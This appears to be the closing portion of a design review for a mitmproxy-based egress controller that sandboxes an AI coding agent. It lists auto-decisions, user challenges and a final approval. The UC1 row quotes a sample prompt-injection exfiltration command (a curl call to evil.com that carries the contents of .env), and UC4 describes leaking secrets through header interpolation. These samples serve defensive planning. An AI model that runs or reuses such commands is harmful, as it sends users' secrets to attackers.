| AD3  | Eng    | Wrap `mitmproxy-init.js` preload in try/catch; verify `undici` resolvability at image build                                                                                                                                   | Mechanical     | P1        | Preload runs on every Node invocation; failure bricks container                       | auto             |
| AD4  | Eng    | Addon: parse config into new immutable ruleset, swap only on success, else serve last-known-good + log degraded health                                                                                                        | Mechanical     | P1        | Mirrors existing `createConfigLoader` semantics; handles partial-JSON writer race     | auto             |
| AD5  | Eng    | Extract matcher + interpolator into pure `rules.py` module; `addon.py` stays thin glue                                                                                                                                        | Mechanical     | P5, P1    | Required for deterministic unit tests                                                 | auto             |
| AD6  | Eng    | Phase 1 exit criteria: add addon unit tests (exact/suffix match, host canonicalization, ports, trailing dots, readonly enforcement, missing env, concurrent reload, `__health` intercept, config disappearance)               | Mechanical     | P1        | Eng voices: "test plan far too thin for risk surface"                                 | auto             |
| AD7  | Eng    | Phase 2 exit criteria: add negative network tests from inside opencode (IPv6, `host.docker.internal`, 169.254.169.254, raw TCP to 1.1.1.1:443, DNS-over-UDP to 8.8.8.8:53) — all must fail                                    | Mechanical     | P1        | Both Eng voices: `internal: true` ≠ full egress block                                 | auto             |
| AD8  | Eng    | opencode image: also set `SSL_CERT_FILE=/etc/ssl/certs/ca-certificates.crt`, `REQUESTS_CA_BUNDLE`, `GIT_SSL_CAINFO`                                                                                                           | Mechanical     | P1        | Non-Node clients (Python, Go, curl variants) ignore system store unless pointed at it | auto             |
| AD9  | DX     | Structured JSON error body + `x-thor-proxy-rule` / `x-thor-proxy-error` response headers on 502/405                                                                                                                           | Mechanical     | P1        | ~20 lines of addon code; LLM can't read container logs, needs in-response signal      | auto             |
| AD10 | DX     | `/__health` returns `{rules: N, mtime, ca_fingerprint}` — not bare 200                                                                                                                                                        | Mechanical     | P5        | Lets contributors verify hot-reload landed; future-proofs for fingerprint check       | auto             |
| AD11 | Eng    | CA fingerprint env var baked at build; opencode startup compares against proxy's cert; fail loud on mismatch                                                                                                                  | Mechanical     | P1        | Guards against desynced rebuilds (Codex Eng + Claude Eng + Claude DX all flagged)     | auto             |
| AD12 | Eng    | Addon: `del flow.request.headers["Proxy-Authorization"]` before forwarding upstream                                                                                                                                           | Mechanical     | P1        | Prevents future internal identity tokens from leaking to upstreams                    | auto             |
| AD13 | Eng    | Addon: canonicalize host (lowercase, strip trailing dot, strip port, reject IPv6 literals); wrap `request(flow)` in try/except classifying errors: `serve_stale_config` / `reject_request` / `fail_startup`                   | Mechanical     | P1        | Unhandled exception in hook = proxy-wide outage                                       | auto             |
| AD14 | DX     | README: full "mitmproxy" section, not a paragraph — match semantics, env interpolation rules, readonly flag, NO*PROXY, restart-vs-hot-reload, troubleshooting table keyed by error code, migration guide from `DATA_ROUTE*\*` | Mechanical     | P1        | Both DX voices flagged "short paragraph" as insufficient                              | auto             |
| AD15 | CEO    | Add a "Success metrics" subsection (failed-agent-attempts-due-to-URL, prompt surface reduction, zero new unauthorized egress, provider reliability) before Phase 1                                                            | Mechanical     | P1        | Exit criteria today are smoke tests, not outcomes                                     | auto             |
| AD16 | Eng    | Add load/soak test in Phase 2: concurrent streaming model-provider calls + 100 rps concurrent API calls, measure latency overhead and error rate                                                                              | Taste          | P1        | Single-process Python mitmproxy at Thor's real peak rps unknown; cheap to measure     | auto (recommend) |
| AD17 | DX     | Ship `scripts/test-proxy.sh` smoke test (exec into opencode, hit one rule-matched URL, verify success + header)                                                                                                               | Mechanical     | P1, P5    | Closes getting-started loop                                                           | auto             |
| AD18 | CEO    | Forward-compat note: Anthropic's Claude-Code sandbox is shipping container-level egress controls — cap investment in bespoke network isolation, keep exits clean                                                              | Taste          | P6        | Single-voice (Claude CEO) but concrete competitive risk                               | auto (recommend) |

**Auto-decisions applied: 18.**
**Items surfaced to approval gate: 4 user challenges + 3 taste decisions.**

### User Challenges (both models disagree with the user's stated direction)

| #       | What plan says                                                               | What both models recommend                                                                                                                                          | Cost if we're wrong                                                                                                                                                                                      |
| ------- | ---------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **UC1** | Deny/allowlist is "out of scope" — pass-through by default                   | v1 must be **deny-by-default** for non-matched hosts, explicit passthrough list (Anthropic, OpenAI), explicit injection list (Atlassian, etc.), everything else 403 | The plan builds the enforcement point and declines to enforce. Five-of-six voices called this out. If we defer, the first prompt-injection that says `curl https://evil.com/?data=$(cat .env)` succeeds. |
| **UC2** | Route all HTTPS through mitmproxy, including Anthropic/OpenAI, with TLS MITM | CONNECT-**passthrough** LLM providers (no cert-based interception) — only MITM hosts we need to inject headers into                                                 | Normalizes centralized inspection of every prompt/completion. May violate provider TOS. Concentrates secret exposure.                                                                                    |
| **UC3** | Generate CA in shared multi-stage `ca-gen` build step; bake into both images | Generate CA **at first boot** into a named volume (or at minimum: bake fingerprint + fail-loud validation between images)                                           | CA private key lives in image layers. One accidental `docker push` and the root CA is on Docker Hub — anyone who pulls can MITM. Rebuild-skew causes opaque TLS errors.                                  |
| **UC4** | `${ENV}` interpolation accepts any container env var                         | Allowlist which env vars are exposable (naming convention like `${OUTBOUND_*}` or explicit list in config)                                                          | Anyone (or anything) with write access to `config.json` can write `"X-Foo": "${RESOLVE_SECRET}"` and exfil container secrets to any listed host.                                                         |

### Taste Decisions (reasonable people could disagree)

| #       | Decision                                                                                | Recommendation                                                                                          | Alternative                                                                                                                                          |
| ------- | --------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------- |
| **TD1** | Per-client identity (`Proxy-Authorization`) in v1                                       | **Defer** — today there's only one client (opencode); forward-compat section covers the extension shape | Codex CEO wants it in v1; Claude CEO is fine deferring. Completeness principle says include; pragmatic principle says one client today = one policy. |
| **TD2** | Decision record for Envoy / Squid / eBPF tripwire                                       | **Add as open question** ("when do we migrate off Python mitmproxy?")                                   | Ignore (premature); or fully evaluate now (premature).                                                                                               |
| **TD3** | Debug escape hatch: `docker-compose.debug.yml` that joins opencode to `outside` network | **Add** — documented "never commit, never prod." Contributors will need this for 2am debugging.         | Skip — force all debugging through mitmproxy. Purer but slower.                                                                                      |

**VERDICT:** APPROVED with user challenges accepted — UC1 (deny-by-default),
UC2 (CONNECT-passthrough for LLM providers), UC3 (CA at first boot into named
volume). UC4 rejected (opencode does not have write access to config.json).
Taste decisions (TD1-TD3) not accepted in this gate.

**Plan changes applied 2026-04-17:**

- Scope updated: allowlist moved in-scope; UC4 rationale added to Out-of-scope
- New section "Host policy model" describing inject/passthrough/deny buckets
- New section "Error response contract" for structured JSON errors + headers
- New section "CA distribution" replacing the multi-stage build approach
- D5 superseded; D15/D16/D17 added to the Decision Log
- Dockerfile examples rewritten to show first-boot CA flow
- 18 mechanical auto-decisions captured in Decision Audit Trail above

**Pending user action:** greenlight to start Phase 1 implementation.
